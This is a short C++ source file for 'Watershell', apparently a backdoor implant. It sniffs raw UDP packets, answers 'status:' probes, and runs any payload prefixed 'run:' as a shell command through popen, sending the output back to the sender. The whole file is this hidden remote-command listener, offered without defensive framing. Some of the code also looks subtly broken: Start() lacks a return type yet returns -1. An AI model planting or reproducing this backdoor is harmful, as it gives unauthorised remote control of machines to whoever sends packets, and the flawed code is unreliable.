#include "watershell.h"

// Constructor
Watershell::Watershell() {

}

Watershell::Start() {
    memset(buf, 0, 2048);
    //get a packet, and tear it apart, look for keywords
    n = recvfrom(sockfd, buf, 2048, 0, NULL, NULL);
    ip = (struct iphdr *)(buf + sizeof(struct ethhdr));
    udp = (struct udphdr *)(buf + ip->ihl*4 + sizeof(struct ethhdr));
    udpdata = (char *)((buf + ip->ihl*4 + 8 + sizeof(struct ethhdr)));


    //checkup on the service, make sure it is still there
    if(!strncmp(udpdata, "status:", 7)){
        send_status(buf, "up");
    }

    //run a command if the data is prefixed with run:
    if (!strncmp(udpdata, "run:", 4)){
        int out = open("/dev/null", O_WRONLY);
        int err = open("/dev/null", O_WRONLY);
        dup2(out, 0);
        dup2(err, 2);

        FILE *fd;
        fd = popen(udpdata + 4, "r");
        if (!fd) return -1;

        char buffer[256];
        size_t chread;
        /* String to store entire command contents in */
        size_t comalloc = 256;
        size_t comlen   = 0;
        char *comout   = malloc(comalloc);

        /* Use fread so binary data is dealt with correctly */
        while ((chread = fread(buffer, 1, sizeof(buffer), fd)) != 0) {
            if (comlen + chread >= comalloc) {
                comalloc *= 2;
                comout = realloc(comout, comalloc);
            }
            memmove(comout + comlen, buffer, chread);
            comlen += chread;
        }
        
        pclose(fd);
        send_status(buf, comout);
    }
}


